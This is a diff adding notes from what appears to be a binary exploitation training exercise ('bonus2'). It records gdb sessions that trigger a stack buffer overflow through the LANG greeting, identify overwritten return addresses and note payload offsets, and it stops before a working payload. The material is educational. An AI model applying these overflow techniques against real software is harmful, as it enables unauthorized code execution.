@@ -1,0 +1,62 @@
+see source
+
+we found a first vulnerability while decompiling, the user is concatenated to a buffer way too small before being printed!
+there is a high chance that with a correct buffer length we will be able to override the stack of greetuser
+let's investigate with gdb using the environment variable LANG set to fi (the longest greeting available)
+
+export LANG=fi
+gdb bonus2
+r 0123456789012345678901234567890123456789 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+
+
+Hyvää päivää 0123456789012345678901234567890123456789AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+
+Program received signal SIGSEGV, Segmentation fault.
+0x46464545 in ?? ()
+
+0x46464545 is FFEE
+
+set env LANG=nl
+r 0123456789012345678901234567890123456789 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+
+
+Goedemiddag! 0123456789012345678901234567890123456789AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+
+Program received signal SIGSEGV, Segmentation fault.
+0x47474746 in ?? ()
+
+0x47474746 is GGGF
+
+set env LANG=en
+r 0123456789012345678901234567890123456789 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+
+
+Hello 0123456789012345678901234567890123456789AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08004848 in ?? ()
+
+welp, seem's like depending on our language the program breaks (the fact that it broke for the english language was a surprise, but it broke at ??HH so it's not really exploitable)
+so we can prepare a payload for either fi or nl (maybe doing both gives more points? :] )
+I wonder if, like bonus0, we are supposed to execute our payload from the buffer in main instead of the copy being passed to greetuser?
+
+b *0x0804862b (break just before greetuser)
+disas
+seem's like the copy was at esp+0x50 (0x0804861a <+241>:   lea    0x50(%esp),%ebx)
+p $esp+0x50 (0xbffff680)
+and the buffer at $esp (0xbffff630)
+
+b greetuser
+c
+disas
+b *0x08048527 (let's break right after puts)
+x/s 0xbffff680 (copy)
+x/s 0xbffff630 (buffer)
+both seem clean and unaltered
+
+time to make our payload(s)
+the only difference between the 2 payloads will be the position where we will write the address of our exploit:
+23rd for nl
+18th for fi
+
+mmm... same issue as bonus0 (we have our payload that works in gdb, but not in situ)
